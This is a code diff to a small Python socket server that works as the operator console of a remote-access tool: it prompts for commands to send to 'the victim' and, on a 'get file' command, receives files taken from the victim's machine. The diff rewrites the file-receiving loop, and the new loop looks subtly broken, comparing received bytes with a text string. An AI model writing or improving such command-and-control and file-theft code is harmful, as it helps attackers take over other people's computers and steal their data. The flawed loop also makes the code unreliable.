@@ -1,5 +1,5 @@
 import socket
-
+from tkinter import filedialog
 
 def server():
     s = socket.socket()
@@ -11,13 +11,16 @@ def server():
     while True:
         command = input('Please enter a command to the victim\n')
         client_socket.send(command.encode('utf-8'))
+
         if 'get file ' in command:
-            size = client_socket.recv((1024).decode('utf-8'))
-            print(size)
-            data_2 = client_socket.recv((size).decode('utf-8'))
             file_path = input("Please enter the path of the file")
-            with open(file_path, 'wb')as f:
-                f.write(data_2)
+            data = None
+            with open(file_path, 'wb')as file:
+                while data != 'complete':
+                    client_socket.sendall('ok'.encode('utf-8'))
+                    data = client_socket.recv(1024)
+                    file.write(data)
+                    file.write('\n'.encode('utf-8'))
 
         else:
             data = client_socket.recv(1024)
